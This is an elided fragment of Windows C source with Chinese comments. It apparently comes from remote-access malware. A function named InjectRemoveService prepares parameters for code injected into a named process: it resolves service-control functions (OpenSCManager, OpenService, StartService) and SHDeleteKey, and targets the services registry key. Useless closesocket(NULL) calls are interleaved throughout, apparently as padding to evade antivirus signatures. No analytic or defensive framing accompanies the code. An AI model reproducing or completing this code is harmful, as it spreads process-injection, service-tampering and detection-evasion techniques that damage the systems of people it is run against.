...
typedef struct
{
	...
	TCHAR				strServiceName[100];	// 服务名称
    TCHAR				strServiceRegKey[100];	// 服务在注册表中的位置
...
bool InjectRemoveService(LPCTSTR lpProcessName, TCHAR *lpServiceName)
{
	TCHAR szModule [MAX_PATH];
	...
	closesocket(NULL);
	remoteParameter.MyOpenSCManager = (TOpenSCManager)GetProcAddress(hAdvapi32, "OpenSCManager");
	closesocket(NULL);
	remoteParameter.MyOpenService = (TOpenService)GetProcAddress(hAdvapi32, "OpenService");
	closesocket(NULL);
	...
	closesocket(NULL);
	remoteParameter.MyStartService = (TStartService)GetProcAddress(hAdvapi32, "StartService");
	closesocket(NULL);
...
//	FreeLibrary(hAdvapi32);	
	...
	closesocket(NULL);
	remoteParameter.MySHDeleteKey = (TSHDeleteKey)GetProcAddress(hShlwapi, "SHDeleteKey");
...
//	FreeLibrary(hKernel32);
	...
	closesocket(NULL);
	lstrcpy(remoteParameter.strServiceRegKey, TEXT("SYSTEM\\CurrentControlSet\\Services\\"));
	closesocket(NULL);
